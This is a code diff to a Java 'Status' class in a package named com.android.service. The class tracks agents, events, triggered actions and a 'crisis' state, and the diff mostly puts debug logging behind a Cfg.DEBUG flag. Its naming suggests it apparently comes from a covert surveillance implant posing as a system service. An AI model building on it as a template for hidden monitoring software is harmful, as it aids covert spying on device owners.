@@ -15,13 +15,11 @@ import android.util.Log;
 
 import com.android.service.action.Action;
 import com.android.service.agent.AgentConf;
-import com.android.service.agent.AgentType;
 import com.android.service.agent.AgentCrisis;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.agent.AgentType;
+import com.android.service.auto.Cfg;
 import com.android.service.conf.Option;
 import com.android.service.event.EventConf;
-import com.android.service.interfaces.Observer;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -142,7 +140,7 @@ public class Status {
 
 		if (agentsMap.containsKey(a.getId()) == true) {
 			// throw new RCSException("Agent " + a.getId() + " already loaded");
-			Log.d("QZ", TAG + " Warn: " + "Substituing agent: " + a);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "Substituing agent: " + a);
 		}
 		AgentType key = a.getId();
 		Check.asserts(key != null, "null key");
@@ -160,11 +158,11 @@ public class Status {
 	 *             the RCS exception
 	 */
 	public void addEvent(final EventConf e) {
-		Log.d("QZ", TAG + " addEvent ");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " addEvent ");
 		// Don't add the same event twice
 		if (eventsMap.containsKey(e.getId()) == true) {
 			// throw new RCSException("Event " + e.getId() + " already loaded");
-			Log.d("QZ", TAG + " Warn: " + "Substituing event: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "Substituing event: " + e);
 		}
 
 		eventsMap.put(e.getId(), e);
@@ -387,7 +385,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				if (AutoConfig.DEBUG) {
+				if (Cfg.DEBUG) {
 					ex.printStackTrace();
 				}
 			}
@@ -405,7 +403,7 @@ public class Status {
 				triggeredSemaphore.wait();
 			}
 		} catch (Exception e) {
-			Log.d("QZ", TAG + " Error: " + " getActionIdTriggered: " + e);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + " getActionIdTriggered: " + e);
 		}
 
 		synchronized (triggeredActions) {
@@ -436,7 +434,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				if (AutoConfig.DEBUG) {
+				if (Cfg.DEBUG) {
 					ex.printStackTrace();
 				}
 			}
@@ -454,7 +452,7 @@ public class Status {
 			try {
 				triggeredSemaphore.notifyAll();
 			} catch (Exception ex) {
-				if (AutoConfig.DEBUG) {
+				if (Cfg.DEBUG) {
 					ex.printStackTrace();
 				}
 			}
@@ -466,7 +464,7 @@ public class Status {
 			crisisType = type;
 		}
 
-		Log.d("QZ", TAG + " setCrisis: " + type);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " setCrisis: " + type);
 
 		AgentConf agent;
 		try {
@@ -477,7 +475,7 @@ public class Status {
 			}
 		} catch (GeneralException e) {
 			// TODO Auto-generated catch block
-			if (AutoConfig.DEBUG) {
+			if (Cfg.DEBUG) {
 				e.printStackTrace();
 			}
 		}
